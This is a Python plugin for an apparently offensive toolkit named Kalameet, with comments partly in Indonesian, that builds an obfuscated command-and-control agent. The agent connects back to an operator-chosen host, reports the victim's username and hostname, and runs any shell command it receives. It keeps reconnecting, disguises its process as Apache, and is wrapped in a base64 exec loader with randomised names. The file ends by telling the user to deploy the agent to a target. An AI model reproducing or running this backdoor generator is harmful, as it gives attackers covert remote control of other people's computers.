import base64
import os
import random
import string
from kalameet.core.base import BasePlugin
from kalameet.core.interface import Colors
from kalameet.config import settings

class ShadowGenPlugin(BasePlugin):
    meta = {
        'name': 'shadow_gen',
        'description': 'Generate Advanced Persistent C2 Agent (Encrypted)',
        'author': 'Kalameet'
    }

    def add_arguments(self, parser):
        parser.add_argument("--lhost", required=True, help="C2 Server IP")
        parser.add_argument("--lport", default="1337", help="C2 Server Port")
        parser.add_argument("--sleep", default="5", help="Beacon Interval (Seconds)")
        parser.add_argument("--out", default="payload.py", help="Output Filename")

    def obfuscate_code(self, code):
        # Teknik Obfuscasi Sederhana (Base64 + Variable Renaming)
        # 1. Encode Base64
        b64_code = base64.b64encode(code.encode()).decode()
        
        # 2. Generate Random Variable Names
        var_exec = ''.join(random.choices(string.ascii_letters, k=8))
        var_b64 = ''.join(random.choices(string.ascii_letters, k=8))
        
        # 3. Bungkus dalam loader
        loader = f"""
import base64 as {var_b64}
import subprocess, socket, time, os, sys, threading

# KALAMEET SHADOW AGENT v1.0
# Encrypted Payload Loader

try:
    exec({var_b64}.b64decode("{b64_code}"))
except Exception as e:
    pass
"""
        return loader

    def run(self, args):
        print(f"{Colors.FAIL}[*] INITIALIZING SHADOW FACTORY...{Colors.ENDC}")
        
        # TEMPLATE AGENT JAHAT (Raw Code)
        # Ini adalah script yang akan berjalan di komputer korban
        agent_code = f"""
import socket
import subprocess
import os
import time
import sys

HOST = '{args.lhost}'
PORT = {args.lport}
SLEEP_TIME = {args.sleep}

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            s.send(b"[+] ONLINE: " + os.getlogin().encode() + b"@" + socket.gethostname().encode())
            
            while True:
                data = s.recv(1024)
                if not data: break
                
                cmd = data.decode().strip()
                
                if cmd == 'terminate':
                    s.close()
                    sys.exit(0)
                
                elif cmd.startswith('cd '):
                    try:
                        os.chdir(cmd[3:])
                        s.send(os.getcwd().encode())
                    except Exception as e:
                        s.send(str(e).encode())
                        
                else:
                    # Eksekusi Perintah
                    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output = proc.stdout.read() + proc.stderr.read()
                    if not output: output = b"[OK] Command Executed (No Output)"
                    s.send(output)
                    
        except Exception as e:
            # Jika koneksi putus, tunggu dan coba lagi (PERSISTENCE LOOP)
            pass
            
        time.sleep(SLEEP_TIME)

if __name__ == '__main__':
    # Teknik menyembunyikan proses (Linux only - Rename process name)
    try:
        import setproctitle
        setproctitle.setproctitle("/usr/sbin/apache2 -k start") 
    except: pass
    
    connect()
"""
        
        # Lakukan Obfuscasi
        print(f"[*] Obfuscating payload...")
        final_payload = self.obfuscate_code(agent_code)
        
        # Simpan
        out_path = os.path.join(settings.OUTPUT_DIR, args.out)
        with open(out_path, "w") as f:
            f.write(final_payload)
            
        print(f"{Colors.GREEN}[+] SHADOW AGENT CREATED: {out_path}{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] Deploy this file to target and run: python3 {args.out}{Colors.ENDC}")
        print(f"{Colors.BLUE}[i] Start your C2 Server now using: kalameet shadow_c2 --port {args.lport}{Colors.ENDC}")